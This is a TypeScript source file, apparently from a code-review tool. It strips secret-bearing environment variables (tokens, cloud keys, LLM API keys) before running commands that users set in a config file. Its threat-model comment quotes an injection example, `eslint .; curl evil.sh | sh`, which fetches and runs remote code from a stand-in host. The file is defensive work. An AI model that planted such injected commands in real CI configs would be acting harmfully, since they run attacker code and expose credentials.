/**
 * Spawn-environment hygiene for user-configured shell commands.
 *
 * Threat model: a malicious PR edits `.advreview.yml` to set `linter.command`
 * (or `vuln_scanner.command`, `test_inversion.command`) to a string that
 * exfiltrates CI secrets, e.g. `eslint .; curl evil.sh | sh`. Those commands
 * run in the review workflow's environment, which on CI holds `GITHUB_TOKEN`,
 * cloud credentials, LLM API keys, npm publish tokens, etc.
 *
 * `sanitizedSpawnEnv()` returns a copy of `process.env` with secret-bearing
 * variables removed so that even if a config-injected command runs, it cannot
 * read the surrounding credentials. It is deliberately a *denylist* that drops
 * anything that looks like a secret, while preserving the variables a real
 * linter/test runner needs to function (`PATH`, `HOME`, `LANG`, …).
 *
 * Only applied to the **user-configured** command path — auto-detected
 * commands (`npm test`, `pytest`, `cargo test`, …) are fixed strings and are
 * not attacker-controlled, so they keep the full environment.
 */

/** Variable-name substrings that almost always indicate a secret. */
const SECRET_NAME_PATTERNS = [
  "TOKEN",
  "SECRET",
  "PASSWORD",
  "PASSWD",
  "CREDENTIAL",
  "PRIVATE_KEY",
  "API_KEY",
  "ACCESS_KEY",
  "AUTH",
];

/**
 * Specific variable names to drop even if they don't match a pattern above.
 * Covers the common CI/LLM/cloud secret names this tool's own workflow exposes.
 */
const SECRET_NAMES = new Set([
  "GITHUB_TOKEN",
  "GH_TOKEN",
  "GH_ENTERPRISE_TOKEN",
  "GITHUB_PAT",
  "NODE_AUTH_TOKEN",
  "NPM_TOKEN",
  "NPM_AUTHTOKEN",
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "AZURE_CLIENT_SECRET",
  "GOOGLE_APPLICATION_CREDENTIALS",
  "OPENAI_API_KEY",
  "ANTHROPIC_API_KEY",
  "GEMINI_API_KEY",
  "GOOGLE_API_KEY",
  "GROQ_API_KEY",
  "OLLAMA_API_KEY",
  "HUGGINGFACE_API_KEY",
  "HF_TOKEN",
  "GITLAB_TOKEN",
  "CODECOV_TOKEN",
  "SNYK_TOKEN",
  "SEMGREP_APP_TOKEN",
]);

/**
 * Return a copy of `process.env` with secret-bearing entries removed.
 *
 * - Drops any variable whose name contains a secret-y substring
 *   (TOKEN, SECRET, PASSWORD, …).
 * - Drops an explicit allowlist-denylist of well-known CI/cloud/LLM secret
 *   names.
 * - Preserves everything else (`PATH`, `HOME`, `USER`, `LANG`, `CI`, …) so
 *   real linters and test runners still work.
 *
 * If `extraAllow` is provided, those names are kept even if they would
 * otherwise be stripped (for callers that intentionally forward a named
 * credential to a trusted sub-tool).
 */
export function sanitizedSpawnEnv(extraAllow: ReadonlySet<string> = new Set()): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};

  for (const [name, value] of Object.entries(process.env)) {
    if (value === undefined) continue;
    if (extraAllow.has(name)) {
      out[name] = value;
      continue;
    }
    if (SECRET_NAMES.has(name)) continue;
    if (SECRET_NAME_PATTERNS.some((p) => name.includes(p))) continue;
    out[name] = value;
  }

  return out;
}